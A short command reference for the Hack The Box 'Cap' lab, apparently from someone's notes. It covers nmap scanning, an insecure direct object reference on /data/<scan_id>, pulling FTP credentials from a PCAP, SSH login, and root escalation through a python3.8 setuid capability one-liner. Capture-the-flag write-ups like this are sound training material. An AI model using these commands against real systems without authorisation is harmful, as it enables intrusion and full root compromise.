# Cap — Command Reference

Commands used during the authorized lab. Replace `<TARGET_IP>` with the active HTB target address.

## Reconnaissance

```bash
nmap -sC -sV <TARGET_IP>
nmap -sC -sV -oN nmap_initial.txt <TARGET_IP>
```

## HTTP exploration

Browse to:

```text
http://<TARGET_IP>/
http://<TARGET_IP>/data/<scan_id>
```

Manually changing the scan ID in this lab exposed differing scan data. Validate authorization boundaries only in the authorized HTB environment.

## PCAP analysis

```bash
wireshark <capture-file>.pcap
```

In Wireshark:
- Statistics → Protocol Hierarchy
- Display filter: `ftp`
- Select a TCP packet → Follow → TCP Stream

## SSH

```bash
ssh nathan@<TARGET_IP>
```

Do not place real passwords in shell history or public documentation.

## Capability enumeration and escalation

```bash
getcap -r / 2>/dev/null
/usr/bin/python3.8 -c 'import os; os.setuid(0); os.system("/bin/bash")'
id
whoami
cd /root
ls -la
cat /root/root.txt
```

## Documentation hygiene

- Never commit `user.txt`, `root.txt` contents, passwords, session cookies, raw PCAPs, or private VPN/configuration files.
- Sanitize screenshots before committing.
- Keep the target IP as a placeholder in public notes unless there is a specific reason to record a lab-assigned address.
